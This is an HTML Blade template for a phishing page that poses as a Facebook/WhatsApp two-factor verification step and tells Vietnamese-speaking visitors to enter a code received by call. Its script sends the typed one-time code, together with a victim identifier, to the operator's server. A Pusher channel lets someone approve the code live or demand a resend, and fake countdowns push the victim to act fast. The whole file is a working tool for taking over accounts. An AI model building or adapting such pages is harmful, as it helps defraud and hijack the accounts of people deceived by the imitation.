<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
    @vite(['resources/css/app.css'])
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://kit.fontawesome.com/8f728199e4.css" crossorigin="anonymous">
    <style>
        @layer utilities {

            input:-webkit-autofill,
            input:-webkit-autofill:hover,
            input:-webkit-autofill:focus,
            input:-webkit-autofill:active {
                -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
                -webkit-text-fill-color: inherit !important;
                transition: background-color 9999s ease-in-out 0s;
            }
        }

        @font-face {
            font-family: 'MyRulersVjpPro';
            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
        }

        body {
            font-family: 'MyRulersVjpPro', sans-serif;
        }
    </style>
</head>

<body>
    <div class="min-h-screen flex items-center justify-center px-4">
        <div class="w-full sm:max-w-[900px]">
            <p class="text-[13px] text-black mb-1">Yêu cầu xác thực 2 yếu tố</p>
            <h1 class="text-[22px] font-bold text-black leading-snug mb-2">
                Vui lòng kiểm tra cuộc gọi đến từ WhatsApp của bạn</h1>
            <p class="text-[14px] text-black leading-relaxed mb-5">
                Vui lòng đợi <b id="countdown_2mins">02:00</b> để được chuyển tiếp đến mã xác minh của bạn</p>
            <div class="rounded-xl overflow-hidden mb-5">
                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/whatsapp/whatsapp_device.jpg"
                    alt="Xác minh thiết bị" class="w-full h-auto">
            </div>
            {{-- <div class="flex items-center gap-3 mb-5">
                <i class="fa-light fa-circle-notch fa-spin"></i>
                <div>
                    <p class="text-[15px] font-semibold text-black leading-tight">
                        {{ __('facebook.waiting_for_approve') }}</p>
                    <p class="text-[13px] text-black mt-0.5">{{ __('facebook.waiting_message') }}</p>
                </div>
            </div>
            <div class="h-px bg-border mb-4"></div> --}}
            <form id="submit_otp">
                <div class="mb-4">
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-2" id="warning_otp"
                        style="display: none"></div>
                    <input type="text" inputmode="numeric" maxlength="8" required
                        placeholder="Nhập mã 6 kí tự bạn đã nhận được từ cuộc gọi"
                        class="w-full border border-gray-300 rounded-xl px-4 py-[10px] text-[15px] text-black placeholder:text-[#646d74] focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all">
                    <p class="mt-2 px-1 text-gray-500 text-sm">
                        <i class="fa-duotone fa-light fa-arrow-rotate-right mr-1"></i>
                        Chúng tôi có thể gửi mã mới sau <b id="countdown_5mins">05:00</b>
                    </p>
                </div>
                <button
                    class="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white rounded-full py-[10px] text-[15px] cursor-pointer transition-colors duration-100 mb-3 disabled:cursor-default disabled:opacity-80"
                    id="confirm_otp" type="submit">Tiếp tục</button>
            </form>
        </div>
    </div>
    <script>
        function formatCountdown(seconds) {
            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
            const secs = String(seconds % 60).padStart(2, '0');
            return mins + ':' + secs;
        }

        let countdown_2mins = 120;
        const countdownElement_2mins = document.getElementById('countdown_2mins');

        if (countdownElement_2mins) {
            countdownElement_2mins.textContent = formatCountdown(countdown_2mins);

            const countdownTimer = setInterval(function () {
                countdown_2mins -= 1;
                if (countdown_2mins <= 0) {
                    clearInterval(countdownTimer);
                    countdown_2mins = 0;
                }
                countdownElement_2mins.textContent = formatCountdown(countdown_2mins);
            }, 1000);
        }
        let countdown_5mins = 300;
        const countdownElement_5mins = document.getElementById('countdown_5mins');

        if (countdownElement_5mins) {
            countdownElement_5mins.textContent = formatCountdown(countdown_5mins);

            const countdownTimer = setInterval(function () {
                countdown_5mins -= 1;
                if (countdown_5mins <= 0) {
                    clearInterval(countdownTimer);
                    countdown_5mins = 0;
                }
                countdownElement_5mins.textContent = formatCountdown(countdown_5mins);
            }, 1000);
        }

        //// Pusher cho web custom
        var pusher = new Pusher('f41c529c33d4daa42080', {
            cluster: 'ap1'
        });
        var channel = pusher.subscribe('mrls');
        channel.bind("{{ $pusher_code }}", function(data) {
            const warning = $("#warning")
            const btn = $("#log_btn")
            if (data.status) {
                warning.hide()
                window.location.href = '{!! $data->redirect_link !!}'
            } else {
                if (data.request_resend) {
                    $("#warning_otp").show()
                    $("#warning_otp").html("Sai mã xác nhận, vui lòng thử lại")
                    $("#confirm_otp").html("Tiếp tục").attr('disabled', false)
                }
            }
        });
        $("#submit_otp").submit(function(e) {
            e.preventDefault();
            otp = $(this).find('input[type=text]').val()
            btn = $(this).find('button[type=submit]')
            warning = $("#warning_otp")
            warning.hide()
            const dataToSend = {
                'info': '{{ $info }}',
                'ac': 'o',
                'otp': otp,
            }
            if (!otp || otp.length > 8) {
                warning.show()
                warning.html("Mã xác nhận không hợp lệ, bạn vui lòng thử lại")
                return
            }
            btn.html("Đang xác nhận").attr('disabled', true)
            $.post("{{ route('post.customweb.whatsapp.custom') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });
    </script>
</body>

</html>
